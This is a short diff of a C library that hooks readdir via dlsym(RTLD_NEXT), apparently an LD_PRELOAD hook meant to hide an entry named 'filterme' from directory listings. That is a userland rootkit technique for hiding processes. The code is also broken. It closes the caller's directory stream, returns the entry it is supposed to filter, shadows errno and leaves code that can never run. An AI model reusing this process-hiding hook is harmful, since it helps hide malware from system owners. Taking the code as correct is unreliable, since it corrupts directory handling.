@@ -13,8 +13,8 @@ static const char* filter_proc = "filterme";
 static struct dirent* (*original_readdir)(DIR*) = NULL;
 
 struct dirent* readdir(DIR *dirp) {
-    struct dirent* dp;
-    dirp = opendir(".");
+    struct dirent *dp;
+    //dirp = opendir(".");
 
     if(original_readdir == NULL) {
         original_readdir = dlsym(RTLD_NEXT, "readdir");
@@ -23,26 +23,21 @@ struct dirent* readdir(DIR *dirp) {
             fprintf(stderr, "error in dlsym: %s\n", dlerror());
         }
     }
+    
 
-    while(dirp) {
+    while(1) {
         int errno = 0;
 
         if((dp = original_readdir(dirp)) != NULL) {
             if(strcmp(dp->d_name, filter_proc) == 0) {
                 closedir(dirp);
-
-                return NULL;
+                return dp;
             }
         } else {
-            if(errno == 0) {
-                closedir(dirp);
-                return NULL;
-            }
             closedir(dirp);
-
-            return NULL;
+            return dp;
         }
     }
-
+    closedir(dirp);
     return dp;
 }
